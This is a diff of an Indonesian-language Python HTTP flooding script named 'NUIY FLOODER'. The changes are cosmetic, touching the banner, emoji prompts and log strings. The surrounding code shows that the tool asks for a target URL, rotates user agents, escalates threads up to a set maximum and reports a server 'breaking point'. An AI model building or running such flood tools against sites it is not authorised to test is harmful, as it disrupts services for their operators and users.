@@ -123,9 +123,9 @@ def check_worker(job_queue, target, duration, user_agents, timeout_val):
                     with print_lock:
                         tag = f"[{METHOD}]"
                         if attempt > 1:
-                            log_debug(f"{C.YELLOW}[🚀-R{attempt}][T{my_thread_count}]{tag}{C.END} {timestamp} | {color}{status}{C.END} | {res_time}ms")
+                            log_debug(f"{C.YELLOW} 🚀-R{attempt}][T{my_thread_count}]{tag}{C.END} {timestamp} | {color}{status}{C.END} | {res_time}ms")
                         else:
-                            log_debug(f"{color}[🚀][T{my_thread_count}]{tag}{C.END} {timestamp} | {color}{status}{C.END} | {res_time}ms")
+                            log_debug(f"{color} 🚀[T{my_thread_count}]{tag}{C.END} {timestamp} | {color}{status}{C.END} | {res_time}ms")
                 break
             except requests.exceptions.Timeout:
                 if attempt == MAX_RETRY:
@@ -178,31 +178,31 @@ def main():
     banner = r"""
  ═══════════════════════════════════════════════════════════
                                                           
-▄▄▄    ▄▄▄ ▄▄▄  ▄▄▄ ▄▄▄▄▄ ▄▄▄   ▄▄▄   ▄▄▄▄▄▄▄  
-████▄  ███ ███  ███  ███  ███   ███   ▀▀▀▀████ 
-███▀██▄███ ███  ███  ███  ▀███▄███▀      ▄██▀  
-███  ▀████ ███▄▄███  ███    ▀███▀      ▄███▄▄▄ 
-███    ███ ▀██████▀ ▄███▄    ███      ████████  💖💜
+    ▄▄▄    ▄▄▄ ▄▄▄  ▄▄▄ ▄▄▄▄▄ ▄▄▄   ▄▄▄   ▄▄▄▄▄▄▄  
+    ████▄  ███ ███  ███  ███  ███   ███   ▀▀▀▀████ 
+    ███▀██▄███ ███  ███  ███  ▀███▄███▀      ▄██▀  
+    ███  ▀████ ███▄▄███  ███    ▀███▀      ▄███▄▄▄ 
+    ███    ███ ▀██████▀ ▄███▄    ███      ████████  💖💜
                                               
 ═══════════════════════════════════════════════════════════
     """
     log(f"{C.CYAN}{banner}{C.END}")
 
-    target = input("[🎯] Masukkan URL Target: ").strip()
+    target = input(" 🎯 Masukkan URL Target: ").strip()
     while not target: target = input("[❌] URL tidak boleh kosong: ").strip()
     TARGET_URL = target
 
-    METHOD = input("[⚡] Method [GET/POST/HEAD] [default GET]: ").strip().upper() or "GET"
+    METHOD = input(" ⚡ Method [GET/POST/HEAD] [default GET]: ").strip().upper() or "GET"
     if METHOD == "POST":
-        payload_input = input('[📦] Payload JSON [contoh: {"user":"admin"}]: ').strip()
+        payload_input = input(' 📦 Payload JSON [contoh: {"user":"admin"}]: ').strip()
         PAYLOAD = parse_payload(payload_input)
 
     try:
-        duration = int(input("[⏱️] Durasi  (detik): "))
-        start_threads = int(input("[👥] Thread Awal [rekomendasi 5]: "))
-        max_threads = int(input("[🔥] Thread Maksimal [rekomendasi 200]: "))
-        timeout_val = float(input("[⏳] Timeout (detik) [default 5]: ") or 5)
-        debug_input = input("[🐛] Debug Mode [ON/OFF] [default ON]: ").strip().upper()
+        duration = int(input(" ⏱️ Durasi  (detik): "))
+        start_threads = int(input(" 👥  Thread Awal [rekomendasi 5]: "))
+        max_threads = int(input(" 🔥  Thread Maksimal [rekomendasi 200]: "))
+        timeout_val = float(input(" ⏳  Timeout (detik) [default 5]: ") or 5)
+        debug_input = input(" 🐛  Debug Mode [ON/OFF] [default ON]: ").strip().upper()
         DEBUG_MODE = False if debug_input == "OFF" else True
     except ValueError:
         log(f"\n{C.RED}[-] Error: Harus angka{C.END}")
@@ -294,7 +294,7 @@ def main():
             if time.time() >= next_escalation and CURRENT_THREADS < max_threads:
                 CURRENT_THREADS += thread_step
                 CURRENT_THREADS = min(CURRENT_THREADS, max_threads)
-                with print_lock: log(f"\n{C.CYAN}{C.BOLD}[💥] ESCALATION UP TO {CURRENT_THREADS} THREAD{C.END}\n")
+                with print_lock: log(f"\n{C.CYAN}{C.BOLD} 💥 ESCALATION UP TO {CURRENT_THREADS} THREAD{C.END}\n")
                 for _ in range(thread_step):
                     t = threading.Thread(target=check_worker, args=(job_queue, target, duration, user_agents, timeout_val))
                     t.daemon = True
@@ -321,7 +321,7 @@ def main():
     break_thread, break_rate = detect_breaking_point()
 
     log("\n" + "="*50)
-    log(f"{C.BOLD}{C.CYAN} NUIY FLOODER REPORT - {target} {C.END}")
+    log(f"{C.BOLD}{C.CYAN} 💖 NUIY FLOODER 💜 REPORT - {target} {C.END}")
     log("="*50)
     log(f"Target : {target} | Method: {METHOD}")
     log(f"Durasi : {duration}s | Thread: {start_threads} -> {max_threads}")
